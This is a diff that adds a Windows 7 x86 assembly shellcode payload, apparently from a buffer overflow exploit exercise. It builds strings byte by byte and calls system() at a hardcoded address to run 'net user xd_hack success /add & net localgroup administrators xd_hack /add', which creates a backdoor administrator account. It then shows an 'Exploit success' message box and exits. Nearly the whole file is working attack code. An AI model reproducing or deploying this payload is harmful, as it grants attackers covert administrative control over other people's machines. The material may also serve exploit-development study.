@@ -1,0 +1,163 @@
+		BITS 32
+		//LoadLibrary
+		push ebp;
+		mov ebp,esp;
+		xor eax,eax;
+		sub esp,10h ;
+		mov byte ptr [ebp-10h],6Dh;	//m
+		mov byte ptr [ebp-0fh],73h; //s
+		mov byte ptr [ebp-0eh],76h;	//v
+		mov byte ptr [ebp-0dh],63h;	//c
+		mov byte ptr [ebp-0ch],72h;	//r  
+		mov byte ptr [ebp-0bh],74h;	//t
+		mov byte ptr [ebp-0ah],al;	//00
+		mov byte ptr [ebp-09h],75h;	//u
+        mov byte ptr [ebp-08h],73h;	//s
+        mov byte ptr [ebp-07h],65h;	//e
+        mov byte ptr [ebp-06h],72h;	//r
+        mov byte ptr [ebp-05h],33h;	//3
+        mov byte ptr [ebp-04h],32h;	//2
+		mov byte ptr [ebp-03h],al;	//00
+		//LoadLibrary("msvcrt.dll");
+		lea eax,[ebp-10h];
+		push eax;
+		mov  ebx,0x76962804;				//LoadLibraryA 0x76962804(win7)
+		call ebx;
+		//LoadLibrary("user32.dll");
+		lea eax,[ebp-09h];
+		push eax;
+		call ebx;
+		mov esp,ebp;
+//		pop ebp;
+
+//		push ebp;
+//		mov ebp,esp;
+		xor eax,eax;
+		sub esp,50h ;
+		mov byte ptr [ebp-4ah],6eh ; //n
+		mov byte ptr [ebp-49h],65h ; //e
+		mov byte ptr [ebp-48h],74h ; //t
+		mov byte ptr [ebp-47h],20h ; 
+		mov byte ptr [ebp-46h],75h ; //u
+		mov byte ptr [ebp-45h],73h ; //s
+		mov byte ptr [ebp-44h],65h ; //e
+		mov byte ptr [ebp-43h],72h ; //r
+		mov byte ptr [ebp-42h],20h ;
+		mov byte ptr [ebp-41h],78h ; //x
+		mov byte ptr [ebp-40h],64h ; //d
+		mov byte ptr [ebp-3fh],5fh ; //_
+		mov byte ptr [ebp-3eh],68h ; //h
+		mov byte ptr [ebp-3dh],61h ; //a
+		mov byte ptr [ebp-3ch],63h ; //c	
+		mov byte ptr [ebp-3bh],6bh ; //k
+		mov byte ptr [ebp-3ah],20h ; //
+		mov byte ptr [ebp-39h],73h ; //s
+		mov byte ptr [ebp-38h],75h ; //u
+		mov byte ptr [ebp-37h],63h ; //c
+		mov byte ptr [ebp-36h],63h ; //c
+		mov byte ptr [ebp-35h],65h ; //e
+		mov byte ptr [ebp-34h],73h ; //s
+		mov byte ptr [ebp-33h],73h ; //s
+		mov byte ptr [ebp-32h],20h ; //  
+		mov byte ptr [ebp-31h],2fh ; ///
+		mov byte ptr [ebp-30h],61h ; //a
+		mov byte ptr [ebp-2fh],64h ; //d
+		mov byte ptr [ebp-2eh],64h ; //d
+		mov byte ptr [ebp-2dh],26h ; //&
+		mov byte ptr [ebp-2ch],6eh ; //n
+		mov byte ptr [ebp-2bh],65h ; //e
+		mov byte ptr [ebp-2ah],74h ; //t
+		mov byte ptr [ebp-29h],20h ; 
+		mov byte ptr [ebp-28h],6ch ; //l
+		mov byte ptr [ebp-27h],6fh ; //o
+		mov byte ptr [ebp-26h],63h ; //c
+		mov byte ptr [ebp-25h],61h ; //a
+		mov byte ptr [ebp-24h],6ch ; //l
+		mov byte ptr [ebp-23h],67h ; //g
+		mov byte ptr [ebp-22h],72h ; //r
+		mov byte ptr [ebp-21h],6fh ; //o
+		mov byte ptr [ebp-20h],75h ; //u
+		mov byte ptr [ebp-1fh],70h ; //p
+		mov byte ptr [ebp-1eh],20h ;
+		mov byte ptr [ebp-1dh],61h ; //a
+		mov byte ptr [ebp-1ch],64h ; //d
+		mov byte ptr [ebp-1bh],6dh ; //m
+		mov byte ptr [ebp-1ah],69h ; //i
+		mov byte ptr [ebp-19h],6eh ; //n
+		mov byte ptr [ebp-18h],69h ; //i
+		mov byte ptr [ebp-17h],73h ; //s
+		mov byte ptr [ebp-16h],74h ; //t
+		mov byte ptr [ebp-15h],72h ; //r
+		mov byte ptr [ebp-14h],61h ; //a
+		mov byte ptr [ebp-13h],74h ; //t
+		mov byte ptr [ebp-12h],6fh ; //o
+		mov byte ptr [ebp-11h],72h ; //r
+		mov byte ptr [ebp-10h],73h ; //s
+		mov byte ptr [ebp-0fh],20h ;
+		mov byte ptr [ebp-0eh],78h ; //x
+		mov byte ptr [ebp-0dh],64h ; //d
+		mov byte ptr [ebp-0ch],5fh ; //_
+		mov byte ptr [ebp-0bh],68h ; //h
+		mov byte ptr [ebp-0ah],61h ; //a
+		mov byte ptr [ebp-09h],63h ; //c	
+		mov byte ptr [ebp-08h],6bh ; //k
+		mov byte ptr [ebp-07h],20h ;
+		mov byte ptr [ebp-06h],2fh ; ///
+		mov byte ptr [ebp-05h],61h ; //a
+		mov byte ptr [ebp-04h],64h ; //d
+		mov byte ptr [ebp-03h],64h ; //d
+		mov byte ptr [ebp-02h],al ;  //00
+		//system("net user xd_hack success /add & net localgroup administrators xd_hack /add");
+		lea eax,[ebp-4ah] ;
+		push eax ;
+		mov eax ,0x75a3b177 ;		//system 0x75a3b177(win7)
+		call eax;
+		mov esp,ebp;
+//		pop ebp;
+
+//		push ebp;
+//		mov ebp,esp;
+		xor ecx,ecx;
+		sub esp,24h;
+		mov byte ptr[ebp-24h], 45h;	//E
+		mov byte ptr[ebp-23h], 78h;	//x
+		mov byte ptr[ebp-22h], 70h;	//p
+		mov byte ptr[ebp-21h], 6ch;	//l
+		mov byte ptr[ebp-20h], 6fh;	//o
+		mov byte ptr[ebp-1fh], 69h;	//i
+		mov byte ptr[ebp-1eh], 74h;	//t
+		mov byte ptr[ebp-1dh], 20h;	//
+		mov byte ptr[ebp-1ch], 73h;	//s
+		mov byte ptr[ebp-1bh], 75h;	//u
+		mov byte ptr[ebp-1ah], 63h;	//c
+		mov byte ptr[ebp-19h], 63h;	//c
+		mov byte ptr[ebp-18h], 65h;	//e
+		mov byte ptr[ebp-17h], 73h;	//s
+		mov byte ptr[ebp-16h], 73h;	//s
+		mov byte ptr[ebp-15h], cl;	//00
+		mov byte ptr[ebp-0fh], 4fh;	//O
+		mov byte ptr[ebp-0eh], 76h;	//v
+		mov byte ptr[ebp-0dh], 65h;	//e
+		mov byte ptr[ebp-0ch], 72h;	//r
+		mov byte ptr[ebp-0bh], 66h;	//f
+		mov byte ptr[ebp-0ah], 6ch;	//l
+		mov byte ptr[ebp-09h], 6fh;	//o
+		mov byte ptr[ebp-08h], 77h;	//w
+		mov byte ptr[ebp-07h], cl;	//00
+		//MessageBox(NULL,"Exploit success","Overflow",MB_OKCANCEL)
+		lea esi , [ebp-24h];
+		lea edi , [ebp-0fh];
+		push 0;
+		push edi;
+		push esi;
+		push 0;
+		mov eax,0x7596ea71;			//MessageBoxA 0x7596ea71(win7)
+		call eax;
+		//ExitProcess(0);
+		push ecx;
+		mov eax, 0x76962a6f			//ExitProcess 0x76962a6f(win7)
+		call eax
+
+		mov esp,ebp;
+		pop ebp;
+}
